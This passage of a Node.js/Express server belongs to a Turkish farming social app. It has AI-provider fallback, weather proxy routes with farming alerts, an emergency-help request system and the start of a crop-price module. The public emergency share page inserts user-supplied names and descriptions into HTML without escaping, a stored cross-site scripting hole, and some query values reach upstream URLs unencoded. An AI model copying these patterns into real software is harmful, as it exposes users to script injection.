            const reply = data?.content?.[0]?.text;
            if (!reply) throw new Error('Anthropic boş yanıt döndürdü');
            console.log(`[AI] Anthropic yanıtı alındı (${reply.length} karakter)`);
            return reply.trim();
        } catch (e) {
            console.error('[AI] Anthropic hatası, sonraki sağlayıcıya geçiliyor:', e.message);
        }
    }

    // ── 4. YEREL LLAMA.CPP (sunucuda zaten kurulu) ───────────────────────
    const llamaUrl = process.env.LLAMA_CPP_URL || 'http://localhost:8080';
    try {
        const res = await fetch(`${llamaUrl}/v1/chat/completions`, {
            method : 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                model      : process.env.LLAMA_MODEL || 'default',
                max_tokens : parseInt(process.env.AI_MAX_TOKENS) || 1024,
                temperature: parseFloat(process.env.AI_TEMPERATURE) || 0.7,
                messages   : [
                    { role: 'system', content: systemPrompt },
                    { role: 'user',   content: message }
                ]
            }),
            signal: AbortSignal.timeout(parseInt(process.env.AI_TIMEOUT_MS) || 60000)
        });
        if (!res.ok) {
            const err = await res.text().catch(() => '');
            throw new Error(`llama.cpp HTTP ${res.status}: ${err.slice(0, 200)}`);
        }
        const data = await res.json();
        const reply = data?.choices?.[0]?.message?.content;
        if (!reply) throw new Error('llama.cpp boş yanıt döndürdü');
        console.log(`[AI] llama.cpp yanıtı alındı (${reply.length} karakter)`);
        return reply.trim();
    } catch (e) {
        console.error('[AI] llama.cpp hatası:', e.message);
    }

    // ── Hiçbir sağlayıcı çalışmıyorsa hata fırlat ───────────────────────
    throw new Error(
        'Hiçbir AI sağlayıcısı yapılandırılmamış veya erişilemiyor. ' +
        '.env dosyasına GROQ_API_KEY, OPENAI_API_KEY, ANTHROPIC_API_KEY ' +
        'veya LLAMA_CPP_URL ekleyin.'
    );
}

// ── 6. AI DURUM (public) ─────────────────────────────────────────────────
// GET /api/ai/status
app.get('/api/ai/status', (req, res) => {
    res.json({
        status: 'online',
        version: '1.0.0',
        model: 'agrolink-ai-v1',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        plans: RATE_LIMITS
    });
});

// ── initializeDatabase'e dev_api_keys tablosunu ekle ─────────────────────
// Bu fonksiyon initializeDatabase içinde çağrılmalı; aşağıdaki hook bunu sağlar:
const _originalInitDB = global._initDevCalled;
if (!_originalInitDB) {
    global._initDevCalled = true;
    const origListen = server.listen.bind(server);
    // initDevApiKeysTable'ı DB init sonrası çalıştır
    setTimeout(() => initDevApiKeysTable().catch(e => console.warn('Dev table init:', e.message)), 3000);
}

// =============================================================================
// END AGRO DEV ROUTES
// =============================================================================

// =============================================================================
// 🌤️ HAVA DURUMU ROTALAR — OpenWeatherMap Proxy
// .env: OPENWEATHER_API_KEY=<key>
// =============================================================================

// GET /api/weather/current?lat=&lon= veya ?city=
app.get('/api/weather/current', async (req, res) => {
    try {
        const apiKey = process.env.OPENWEATHER_API_KEY;
        if (!apiKey) return res.status(500).json({ error: 'OPENWEATHER_API_KEY .env\'de tanımlı değil' });
        const { lat, lon, city, lang = 'tr', units = 'metric' } = req.query;
        let url;
        if (lat && lon) {
            url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&lang=${lang}&units=${units}`;
        } else if (city) {
            url = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(city)}&appid=${apiKey}&lang=${lang}&units=${units}`;
        } else {
            return res.status(400).json({ error: 'lat/lon veya city parametresi gerekli' });
        }
        const response = await fetch(url);
        const data = await response.json();
        if (!response.ok) return res.status(response.status).json(data);
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// GET /api/weather/forecast?lat=&lon= veya ?city=  (5 günlük)
app.get('/api/weather/forecast', async (req, res) => {
    try {
        const apiKey = process.env.OPENWEATHER_API_KEY;
        if (!apiKey) return res.status(500).json({ error: 'OPENWEATHER_API_KEY .env\'de tanımlı değil' });
        const { lat, lon, city, lang = 'tr', units = 'metric', cnt = 40 } = req.query;
        let url;
        if (lat && lon) {
            url = `https://api.openweathermap.org/data/2.5/forecast?lat=${lat}&lon=${lon}&appid=${apiKey}&lang=${lang}&units=${units}&cnt=${cnt}`;
        } else if (city) {
            url = `https://api.openweathermap.org/data/2.5/forecast?q=${encodeURIComponent(city)}&appid=${apiKey}&lang=${lang}&units=${units}&cnt=${cnt}`;
        } else {
            return res.status(400).json({ error: 'lat/lon veya city parametresi gerekli' });
        }
        const response = await fetch(url);
        const data = await response.json();
        if (!response.ok) return res.status(response.status).json(data);
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// GET /api/weather/air?lat=&lon=  (Hava kalitesi AQI)
app.get('/api/weather/air', async (req, res) => {
    try {
        const apiKey = process.env.OPENWEATHER_API_KEY;
        if (!apiKey) return res.status(500).json({ error: 'OPENWEATHER_API_KEY .env\'de tanımlı değil' });
        const { lat, lon } = req.query;
        if (!lat || !lon) return res.status(400).json({ error: 'lat ve lon parametresi gerekli' });
        const url = `https://api.openweathermap.org/data/2.5/air_pollution?lat=${lat}&lon=${lon}&appid=${apiKey}`;
        const response = await fetch(url);
        const data = await response.json();
        if (!response.ok) return res.status(response.status).json(data);
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// GET /agro-hava/ → public/agro-hava/index.html
app.get('/agro-hava', (req, res) => res.redirect('/agro-hava/'));
app.get('/agro-hava/', (req, res) => {
    const p = path.join(__dirname, 'public', 'agro-hava', 'index.html');
    fssync.existsSync(p) ? res.sendFile(p) : res.status(404).json({ error: 'agro-hava sayfası bulunamadı. public/agro-hava/index.html ekleyin.' });
});

// ─── GET /api/weather — HAVA DURUMU ──────────────────────────────
// OpenWeatherMap kullanır (OPENWEATHER_API_KEY varsa)
// Open-Meteo fallback (ücretsiz, key gerekmez)
app.get('/api/weather', authenticateToken, async (req, res) => {
    try {
        const { lat, lon } = req.query;
        if (!lat || !lon) return res.status(400).json({ error: 'lat ve lon gerekli' });

        const DAY_NAMES = ['Paz', 'Pzt', 'Sal', 'Çar', 'Per', 'Cum', 'Cmt'];
        const apiKey = process.env.OPENWEATHER_API_KEY;

        // ─── Nominatim reverse geocode (her iki durumda da kullan) ───
        let cityName = '';
        try {
            const gcRes = await fetch(
                `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=tr`,
                { headers: { 'User-Agent': 'AgroSosyal/1.0 (agrolink.app)' } }
            );
            if (gcRes.ok) {
                const gc = await gcRes.json();
                const a = gc.address || {};
                cityName = [a.village || a.town || a.neighbourhood || a.city || a.county, a.state].filter(Boolean).join(', ');
            }
        } catch(_) {}

        // ─── OWM WMO code mapper ────────────────────────────────────
        const owmIcon = (id) => {
            if (id >= 200 && id < 300) return ['⛈️', 'Fırtınalı'];
            if (id >= 300 && id < 400) return ['🌦️', 'Çiseleyen'];
            if (id >= 500 && id < 504) return ['🌧️', 'Yağmurlu'];
            if (id === 511)            return ['🌨️', 'Dondurucu Yağmur'];
            if (id >= 520 && id < 600) return ['🌦️', 'Sağanaklı'];
            if (id >= 600 && id < 700) return ['❄️', 'Karlı'];
            if (id >= 700 && id < 800) return ['🌫️', 'Sisli'];
            if (id === 800)            return ['☀️', 'Açık ve Güneşli'];
            if (id === 801)            return ['🌤️', 'Az Bulutlu'];
            if (id === 802)            return ['⛅', 'Parçalı Bulutlu'];
            if (id >= 803)             return ['☁️', 'Bulutlu'];
            return ['🌡️', 'Bilinmiyor'];
        };

        // ─── OpenWeatherMap (API key varsa) ─────────────────────────
        if (apiKey) {
            const [curRes, frcRes] = await Promise.all([
                fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&lang=tr&units=metric`),
                fetch(`https://api.openweathermap.org/data/2.5/forecast?lat=${lat}&lon=${lon}&appid=${apiKey}&lang=tr&units=metric&cnt=40`)
            ]);

            if (!curRes.ok) {
                const err = await curRes.json().catch(() => ({}));
                if (curRes.status === 401) {
                    console.warn('[weather] OWM key geçersiz, Open-Meteo\'ya geçiliyor');
                    // fallback'e düş
                } else {
                    return res.status(curRes.status).json({ error: err.message || 'OWM hatası' });
                }
            } else {
                const cur = await curRes.json();
                const frc = frcRes.ok ? await frcRes.json() : { list: [] };

                // Günlük tahmin (3saat'lik listeden)
                const dailyMap = {};
                (frc.list || []).forEach(item => {
                    const d = new Date(item.dt * 1000);
                    const key = d.toISOString().split('T')[0];
                    const [ico, desc] = owmIcon(item.weather[0]?.id || 800);
                    if (!dailyMap[key]) {
                        dailyMap[key] = { high: item.main.temp_max, low: item.main.temp_min, icon: ico, description: desc, precipitation: (item.rain?.['3h'] || 0), dayName: DAY_NAMES[d.getDay()] };
                    } else {
                        if (item.main.temp_max > dailyMap[key].high) dailyMap[key].high = item.main.temp_max;
                        if (item.main.temp_min < dailyMap[key].low)  dailyMap[key].low  = item.main.temp_min;
                        dailyMap[key].precipitation += (item.rain?.['3h'] || 0);
                    }
                });
                const daily = Object.values(dailyMap).slice(0, 7);
                const [curIcon, curDesc] = owmIcon(cur.weather[0]?.id || 800);
                const temp = cur.main.temp;
                const month = new Date().getMonth() + 1;

                return res.json({
                    city: cityName || cur.name,
                    source: 'openweathermap',
                    current: {
                        temp, feelsLike: cur.main.feels_like,
                        humidity: cur.main.humidity,
                        windSpeed: Math.round((cur.wind?.speed || 0) * 3.6),
                        visibility: Math.round((cur.visibility || 10000) / 1000),
                        precipitation: cur.rain?.['1h'] || 0,
                        description: cur.weather[0]?.description || curDesc,
                        icon: curIcon, weathercode: cur.weather[0]?.id
                    },
                    daily,
                    alerts: buildWeatherAlerts(temp, cur.rain?.['1h'] || 0, (cur.wind?.speed || 0) * 3.6, daily),
                    farmingCalendar: buildFarmingCalendar(temp, cur.rain?.['1h'] || 0, (cur.wind?.speed || 0) * 3.6, daily, month)
                });
            }
        }

        // ─── Open-Meteo fallback (API key yoksa veya OWM başarısızsa) ─
        const wmoDesc = (code) => {
            const map = {
                0:['☀️','Açık'],1:['🌤️','Az Bulutlu'],2:['⛅','Parçalı Bulutlu'],3:['☁️','Kapalı'],
                45:['🌫️','Sisli'],48:['🌫️','Yoğun Sis'],51:['🌦️','Hafif Çiseleme'],53:['🌦️','Çiseleme'],
                55:['🌧️','Yoğun Çiseleme'],61:['🌧️','Hafif Yağmur'],63:['🌧️','Yağmurlu'],
                65:['🌧️','Şiddetli Yağmur'],71:['❄️','Hafif Kar'],73:['❄️','Karlı'],75:['❄️','Yoğun Kar'],
                80:['🌦️','Sağanak'],81:['🌧️','Kuvvetli Sağanak'],95:['⛈️','Fırtına'],99:['⛈️','Şiddetli Fırtına']
            };
            return map[code] || ['🌡️','Bilinmiyor'];
        };

        const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}` +
            `&current=temperature_2m,apparent_temperature,relative_humidity_2m,weathercode,windspeed_10m,precipitation,visibility` +
            `&daily=weathercode,temperature_2m_max,temperature_2m_min,precipitation_sum,windspeed_10m_max` +
            `&timezone=Europe%2FIstanbul&forecast_days=7`;

        const meteoRes = await fetch(url);
        if (!meteoRes.ok) return res.status(502).json({ error: 'Hava servisi yanıt vermedi' });
        const m = await meteoRes.json();
        const cur = m.current || {};
        const daily2 = (m.daily?.time || []).map((date, i) => {
            const d = new Date(date);
            const [ico, desc] = wmoDesc(m.daily.weathercode?.[i] || 0);
            return { dayName: DAY_NAMES[d.getDay()], date, high: m.daily.temperature_2m_max?.[i], low: m.daily.temperature_2m_min?.[i], precipitation: m.daily.precipitation_sum?.[i] || 0, windMax: m.daily.windspeed_10m_max?.[i] || 0, icon: ico, description: desc };
        });
        const [curIcon2, curDesc2] = wmoDesc(cur.weathercode || 0);
        const temp2 = cur.temperature_2m ?? 15;
        const month2 = new Date().getMonth() + 1;

        res.json({
            city: cityName || `${parseFloat(lat).toFixed(2)}°N`,
            source: 'open-meteo (fallback)',
            current: {
                temp: temp2, feelsLike: cur.apparent_temperature,
                humidity: cur.relative_humidity_2m,
                windSpeed: Math.round(cur.windspeed_10m || 0),
                visibility: cur.visibility ? Math.round(cur.visibility / 1000) : null,
                precipitation: cur.precipitation || 0,
                description: curDesc2, icon: curIcon2, weathercode: cur.weathercode
            },
            daily: daily2,
            alerts: buildWeatherAlerts(temp2, cur.precipitation || 0, cur.windspeed_10m || 0, daily2),
            farmingCalendar: buildFarmingCalendar(temp2, cur.precipitation || 0, cur.windspeed_10m || 0, daily2, month2)
        });
    } catch(e) {
        console.error('[weather]', e.message);
        res.status(500).json({ error: 'Hava durumu alınamadı: ' + e.message });
    }
});

function buildWeatherAlerts(temp, precip, wind, days) {
    const alerts = [];
    if (temp !== null && temp <= 2) alerts.push({ id:'frost', icon:'❄️', severity:'high', title:'Don Uyarısı!', description:`Sıcaklık ${temp.toFixed(1)}°C — Hassas bitkilerinizi örtün, sulama yapmayın.` });
    if (temp !== null && temp >= 38) alerts.push({ id:'heat', icon:'🌡️', severity:'high', title:'Aşırı Sıcak!', description:`${temp.toFixed(1)}°C — Sabah erken veya akşam sulayın, gölgeleme yapın.` });
    if (wind > 50) alerts.push({ id:'wind', icon:'🌬️', severity:'high', title:'Şiddetli Rüzgar', description:`${Math.round(wind)} km/h — İlaçlama yapmayın, örtü ve sera kontrolü.` });
    if (precip > 10) alerts.push({ id:'rain', icon:'🌧️', severity:'medium', title:'Yoğun Yağış', description:`Tarla çalışmalarını durdurun, drenaj kontrolü yapın.` });
    // Önümüzdeki günlerde don var mı?
    const frostDay = days.find((d,i) => i > 0 && d.low !== null && d.low <= 0);
    if (frostDay) alerts.push({ id:'frost_coming', icon:'🥶', severity:'medium', title:`${frostDay.dayName} Don Geliyor`, description:`${frostDay.dayName} gece min ${frostDay.low.toFixed(1)}°C — Hazırlık yapın.` });
    return alerts;
}

function buildFarmingCalendar(temp, precip, wind, days, month) {
    const tips = [];
    const monthCrops = {
        1:  ['Sera sebzeleri hazırlığı','Toprak analizi yaptırma zamanı','Fide fidanlık planlaması'],
        2:  ['Erken domates fidesi ekim','Biber tohumu ekimi (sera)','Meyve ağacı budama'],
        3:  ['Patates ekimi (güneyde)','Soğan ekimi','Hububat gübrelemesi'],
        4:  ['Domates-biber fidesi dikimi','Ayçiçeği ekimi','Pamuk ekimine hazırlık'],
        5:  ['Mısır ekimi','Tütün fidesi dikimi','Bağ bakımı'],
        6:  ['Yoğun sulama dönemi','Çay hasadı','Kiraz-kayısı hasadı'],
        7:  ['Tahıl hasadı','Ayçiçeği hasadı hazırlığı','Hasattan sonra toprak işleme'],
        8:  ['Pamuk hasadı başlangıç','Domates-biber hasadı','Ikinci ürün mısır ekimi'],
        9:  ['Fındık hasadı','Üzüm bağ bozumu','Pirinç hasadı'],
        10: ['Buğday-arpa ekimi','Kışlık hububat ekim dönemi','Soğan-sarımsak ekimi'],
        11: ['Sebze fide hazırlığı','Meyve ağacı dönemi bakımı','Toprak hazırlığı'],
        12: ['Kış budaması','Gübreleme planlaması','Ekipman bakım dönemi']
    };
    const seasonalTips = monthCrops[month] || [];
    seasonalTips.forEach(t => tips.push({ type:'calendar', icon:'📅', text:t }));

    // Hava bazlı anlık öneriler
    if (temp !== null) {
        if (temp > 20 && temp < 30 && precip < 1 && wind < 20)
            tips.push({ type:'now', icon:'✅', text:'İlaçlama için ideal koşullar (rüzgar düşük, nem uygun)' });
        if (temp > 15 && temp < 28)
            tips.push({ type:'now', icon:'💧', text:'Sulama için uygun sıcaklık — sabah erken veya akşam sulayın' });
        if (precip > 5)
            tips.push({ type:'warning', icon:'🚫', text:'Bugün ilaçlama yapma — yağmur ilaçları yıkar' });
        if (temp < 5 && temp > 0)
            tips.push({ type:'warning', icon:'🧊', text:'Düşük sıcaklık — yeni dikilmiş fideleri koru' });
        if (temp > 35)
            tips.push({ type:'warning', icon:'☀️', text:'Sıcak hava — öğle saatlerinde sulama ve ilaçlama yapma' });
        if (wind < 15 && temp > 10 && temp < 30)
            tips.push({ type:'now', icon:'🚜', text:'Tarla işleme ve gübreleme için uygun hava' });
    }

    // Gelecek 3 gün tahmin
    days.slice(1, 4).forEach(d => {
        if (d.precipitation > 8)
            tips.push({ type:'forecast', icon:'🌧️', text:`${d.dayName}: Yoğun yağış bekleniyor — tarla çalışması planlamayın` });
        if (d.low !== null && d.low <= 2)
            tips.push({ type:'forecast', icon:'❄️', text:`${d.dayName} gece: Don riski (${d.low.toFixed(0)}°C) — koruma önlemi alın` });
    });

    return tips.slice(0, 8);
}

// ─── POST /api/weather/push-alert — Push uyarısı gönder ──────────
app.post('/api/weather/push-alert', authenticateToken, async (req, res) => {
    try {
        if (req.user.role !== 'admin') return res.status(403).json({ error: 'Sadece admin' });
        const { title, body, url = '/' } = req.body;
        if (!title || !body) return res.status(400).json({ error: 'title ve body gerekli' });
        if (!webpush) return res.status(500).json({ error: 'web-push kurulu değil' });

        const subs = await dbAll(
            `SELECT endpoint, p256dh, auth FROM push_subscriptions WHERE "isActive"=TRUE LIMIT 500`
        );

        const payload = JSON.stringify({ title, body, url, icon: '/agro.png', tag: 'weather-alert' });
        let sent = 0, failed = 0;

        await Promise.allSettled(subs.map(async s => {
            try {
                await webpush.sendNotification({ endpoint: s.endpoint, keys: { p256dh: s.p256dh, auth: s.auth } }, payload);
                sent++;
            } catch(e) {
                failed++;
                if (e.statusCode === 410)
                    await dbRun(`UPDATE push_subscriptions SET "isActive"=FALSE WHERE endpoint=$1`, [s.endpoint]).catch(()=>{});
            }
        }));

        res.json({ success: true, sent, failed, total: subs.length });
    } catch(e) { res.status(500).json({ error: e.message }); }
});





// =============================================================================
// END HAVA DURUMU ROTALAR
// =============================================================================

// =============================================================================
// 🆘 ACİL YARDIM SİSTEMİ — /api/acil-yardim
// =============================================================================

// DB Migration — tabloyu oluştur
(async () => {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS acil_yardim_talepleri (
                id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                "userId"    UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                description TEXT NOT NULL,
                lat         DOUBLE PRECISION,
                lon         DOUBLE PRECISION,
                "locationName" TEXT,
                status      TEXT NOT NULL DEFAULT 'aktif',
                "helpersCount" INT NOT NULL DEFAULT 0,
                "commentCount" INT NOT NULL DEFAULT 0,
                "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
            );
            CREATE TABLE IF NOT EXISTS acil_yardim_yorumlar (
                id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                "talepId"   UUID NOT NULL REFERENCES acil_yardim_talepleri(id) ON DELETE CASCADE,
                "userId"    UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                content     TEXT NOT NULL,
                "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
            );
            CREATE TABLE IF NOT EXISTS acil_yardim_helpers (
                id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                "talepId"   UUID NOT NULL REFERENCES acil_yardim_talepleri(id) ON DELETE CASCADE,
                "userId"    UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                UNIQUE("talepId","userId")
            );
            CREATE INDEX IF NOT EXISTS idx_acil_status ON acil_yardim_talepleri(status,"createdAt" DESC);
            CREATE INDEX IF NOT EXISTS idx_acil_yorumlar ON acil_yardim_yorumlar("talepId");
        `);
        console.log('✅ Acil Yardım tabloları hazır');
    } catch(e) { console.error('[acil-yardim migration]', e.message); }
})();

// GET /api/acil-yardim — talepleri listele
app.get('/api/acil-yardim', authenticateToken, async (req, res) => {
    try {
        const { lat, lon, radius = 50, limit = 30 } = req.query;

        let query = `
            SELECT t.*, u.name as "userName", u.username as "userUsername",
                   u."profilePic" as "userProfilePic"
            FROM acil_yardim_talepleri t
            JOIN users u ON u.id = t."userId"
            WHERE t."createdAt" > NOW() - INTERVAL '72 hours'
        `;
        const params = [];

        // Coğrafi filtre
        if (lat && lon) {
            params.push(parseFloat(lat), parseFloat(lon), parseFloat(radius));
            query += ` AND (
                6371 * acos(
                    cos(radians($${params.length-2})) * cos(radians(t.lat)) *
                    cos(radians(t.lon) - radians($${params.length-1})) +
                    sin(radians($${params.length-2})) * sin(radians(t.lat))
                )
            ) <= $${params.length}`;
        }

        query += ` ORDER BY CASE WHEN t.status='aktif' THEN 0 ELSE 1 END, t."createdAt" DESC LIMIT ${parseInt(limit)}`;

        const { rows: talepler } = await pool.query(query, params);

        // Her talep için yorumları al
        for (const talep of talepler) {
            const { rows: yorumlar } = await pool.query(`
                SELECT y.*, u.name as "userName", u."profilePic" as "userProfilePic"
                FROM acil_yardim_yorumlar y
                JOIN users u ON u.id = y."userId"
                WHERE y."talepId" = $1
                ORDER BY y."createdAt" ASC LIMIT 10
            `, [talep.id]);
            talep.comments = yorumlar;
        }

        res.json({ talepler });
    } catch(e) { console.error('[acil list]', e.message); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/acil-yardim — yeni talep
app.post('/api/acil-yardim', authenticateToken, async (req, res) => {
    try {
        const { lat, lon, locationName, description } = req.body;
        if (!description?.trim()) return res.status(400).json({ error: 'Açıklama gerekli' });

        // Aktif talebi var mı?
        const existing = await pool.query(
            `SELECT id FROM acil_yardim_talepleri WHERE "userId"=$1 AND status='aktif' AND "createdAt" > NOW() - INTERVAL '6 hours'`,
            [req.user.id]
        );
        if (existing.rows.length > 0) return res.status(429).json({ error: 'Zaten aktif bir talebiniz var' });

        const talepId = uuidv4();
        await pool.query(
            `INSERT INTO acil_yardim_talepleri (id,"userId",description,lat,lon,"locationName")
             VALUES ($1,$2,$3,$4,$5,$6)`,
            [talepId, req.user.id, description.trim(), lat||null, lon||null, locationName||null]
        );

        // Bölgedeki kullanıcılara push bildirim gönder
        const user = await pool.query(`SELECT name FROM users WHERE id=$1`, [req.user.id]);
        const userName = user.rows[0]?.name || 'Bir çiftçi';

        if (webpush) {
            // Tüm aktif abonelere gönder (büyük sistemde radius filtrelenebilir)
            const { rows: subs } = await pool.query(
                `SELECT endpoint, p256dh, auth FROM push_subscriptions WHERE "isActive"=TRUE LIMIT 200`
            );
            const payload = JSON.stringify({
                title: `🆘 ACİL YARDIM — ${locationName || 'Yakınınızda'}`,
                body: `${userName}: ${description.slice(0, 80)}`,
                url: `/acil/${talepId}`,
                tag: 'acil-yardim',
                icon: '/agro.png'
            });
            Promise.allSettled(subs.map(s =>
                webpush.sendNotification({ endpoint: s.endpoint, keys: { p256dh: s.p256dh, auth: s.auth } }, payload)
                    .catch(err => { if (err.statusCode === 410) pool.query(`UPDATE push_subscriptions SET "isActive"=FALSE WHERE endpoint=$1`, [s.endpoint]); })
            ));
        }

        // Socket ile online kullanıcılara anlık bildir
        if (io) {
            io.emit('acil_yardim_yeni', {
                talepId, userName, description: description.slice(0,80),
                locationName: locationName || '', lat, lon
            });
        }

        res.status(201).json({ success: true, talepId });
    } catch(e) { console.error('[acil create]', e.message); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/acil-yardim/:id/gidiyorum
app.post('/api/acil-yardim/:id/gidiyorum', authenticateToken, async (req, res) => {
    try {
        const { id } = req.params;
        await pool.query(
            `INSERT INTO acil_yardim_helpers ("talepId","userId") VALUES ($1,$2) ON CONFLICT DO NOTHING`,
            [id, req.user.id]
        );
        await pool.query(
            `UPDATE acil_yardim_talepleri SET "helpersCount"=(SELECT COUNT(*) FROM acil_yardim_helpers WHERE "talepId"=$1) WHERE id=$1`,
            [id]
        );
        // Talep sahibine bildir
        const talep = await pool.query(`SELECT "userId" FROM acil_yardim_talepleri WHERE id=$1`, [id]);
        const helper = await pool.query(`SELECT name FROM users WHERE id=$1`, [req.user.id]);
        if (talep.rows[0] && io) {
            const ownerSockets = onlineUsers?.get(talep.rows[0].userId);
            if (ownerSockets) ownerSockets.forEach(sid =>
                io.to(sid).emit('acil_helper_geldi', { helperName: helper.rows[0]?.name })
            );
        }
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// PATCH /api/acil-yardim/:id — durum güncelle
app.patch('/api/acil-yardim/:id', authenticateToken, async (req, res) => {
    try {
        const { status } = req.body;
        await pool.query(
            `UPDATE acil_yardim_talepleri SET status=$1,"updatedAt"=NOW() WHERE id=$2 AND "userId"=$3`,
            [status, req.params.id, req.user.id]
        );
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// POST /api/acil-yardim/:id/yorum
app.post('/api/acil-yardim/:id/yorum', authenticateToken, async (req, res) => {
    try {
        const { content } = req.body;
        if (!content?.trim()) return res.status(400).json({ error: 'İçerik gerekli' });
        const yorumId = uuidv4();
        await pool.query(
            `INSERT INTO acil_yardim_yorumlar (id,"talepId","userId",content) VALUES ($1,$2,$3,$4)`,
            [yorumId, req.params.id, req.user.id, content.trim()]
        );
        await pool.query(
            `UPDATE acil_yardim_talepleri SET "commentCount"="commentCount"+1 WHERE id=$1`,
            [req.params.id]
        );
        res.status(201).json({ id: yorumId });
    } catch(e) { res.status(500).json({ error: 'Sunucu hatası' }); }
});

// GET /acil/:id — public share sayfası
app.get('/acil/:id', async (req, res) => {
    try {
        const talep = await pool.query(
            `SELECT t.*,u.name FROM acil_yardim_talepleri t JOIN users u ON u.id=t."userId" WHERE t.id=$1`,
            [req.params.id]
        );
        if (!talep.rows[0]) return res.status(404).send('<h1>Bulunamadı</h1>');
        const t = talep.rows[0];
        res.type('html').send(`<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>🆘 Acil Yardım - ${t.name}</title>
<meta property="og:title" content="🆘 ACİL YARDIM: ${t.name}">
<meta property="og:description" content="${t.description}">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:sans-serif;background:#1a1a2e;color:white;text-align:center;padding:40px 20px}
.card{background:#dc2626;border-radius:24px;padding:32px;max-width:400px;margin:0 auto}
h1{font-size:2em;margin-bottom:8px}p{opacity:.9;margin:8px 0}
a{display:block;margin-top:24px;padding:16px;background:white;color:#dc2626;border-radius:16px;font-weight:900;text-decoration:none}</style>
</head><body>
<div class="card">
<div style="font-size:64px">🆘</div>
<h1>ACİL YARDIM</h1>
<p><strong>${t.name}</strong></p>
<p>${t.description}</p>
<p>📍 ${t.locationName || 'Konum bilgisi mevcut'}</p>
<p>${t.helpersCount} kişi gidiyor</p>
<a href="/">Agro Sosyal'de Yardım Et</a>
</div></body></html>`);
    } catch(e) { res.status(500).send('Hata'); }
});

// =============================================================================
// 💰 TARIM FİYATLARI — /api/tarim-fiyatlari
// =============================================================================

// DB Migration
(async () => {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS tarim_fiyat_takip (
                id        UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                "userId"  UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                "urunId"  TEXT NOT NULL,
                "createdAt" TIMESTAMPTZ DEFAULT NOW(),
                UNIQUE("userId","urunId")
            );
        `);
        console.log('✅ Fiyat takip tablosu hazır');
    } catch(e) { console.error('[fiyat migration]', e.message); }
})();

// Statik fiyat verisi (gerçek sistemde TMO/TIGEM scraping yapılır)
// ─── TARIM FİYATLARI — Gerçek veri + cache ─────────────────────
// Kaynak: Ticaret Bakanlığı / Hal fiyatları (ücretsiz, herkese açık)
// 1 saatte bir scrape edilir, cache'te tutulur

const _fiyatCache = { data: null, at: 0 };

// Temel ürün listesi (static) + anlık fiyatlar web'den
const URUN_LISTESI = [
    { id:'bugday',   ad:'Buğday',     emoji:'🌾', birim:'kg',  kategori:'Tahıllar',       featured:true  },
    { id:'misir',    ad:'Mısır',      emoji:'🌽', birim:'kg',  kategori:'Tahıllar',       featured:true  },
    { id:'arpa',     ad:'Arpa',       emoji:'🫘', birim:'kg',  kategori:'Tahıllar',       featured:false },
    { id:'findik',   ad:'Fındık',     emoji:'🌰', birim:'kg',  kategori:'Endüstriyel',    featured:true  },
    { id:'cay',      ad:'Çay',        emoji:'🍃', birim:'kg',  kategori:'Endüstriyel',    featured:false },
    { id:'pamuk',    ad:'Pamuk',      emoji:'☁️', birim:'kg',  kategori:'Endüstriyel',    featured:false },
    { id:'domates',  ad:'Domates',    emoji:'🍅', birim:'kg',  kategori:'Sebze',          featured:true  },
    { id:'patates',  ad:'Patates',    emoji:'🥔', birim:'kg',  kategori:'Sebze',          featured:false },
    { id:'biber',    ad:'Biber',      emoji:'🫑', birim:'kg',  kategori:'Sebze',          featured:false },
    { id:'sogan',    ad:'Soğan',      emoji:'🧅', birim:'kg',  kategori:'Sebze',          featured:false },
    { id:'sarimsak', ad:'Sarımsak',   emoji:'🧄', birim:'kg',  kategori:'Sebze',          featured:false },
    { id:'salatalik',ad:'Salatalık',  emoji:'🥒', birim:'kg',  kategori:'Sebze',          featured:false },
    { id:'elma',     ad:'Elma',       emoji:'🍎', birim:'kg',  kategori:'Meyve',          featured:false },
    { id:'uzum',     ad:'Üzüm',       emoji:'🍇', birim:'kg',  kategori:'Meyve',          featured:true  },
    { id:'portakal', ad:'Portakal',   emoji:'🍊', birim:'kg',  kategori:'Meyve',          featured:false },
    { id:'aycicek',  ad:'Ayçiçek',   emoji:'🌻', birim:'kg',  kategori:'Yağlı Tohumlar', featured:true  },
    { id:'soya',     ad:'Soya',       emoji:'🫛', birim:'kg',  kategori:'Yağlı Tohumlar', featured:false },
    { id:'kolza',    ad:'Kolza',      emoji:'🌼', birim:'kg',  kategori:'Yağlı Tohumlar', featured:false },
];

// Gerçek fiyatları çek — hal fiyatları API'si
async function fetchGercekFiyatlar() {
    const now = Date.now();
    // 1 saatlik cache
    if (_fiyatCache.data && now - _fiyatCache.at < 3600000) {
        return _fiyatCache.data;
    }

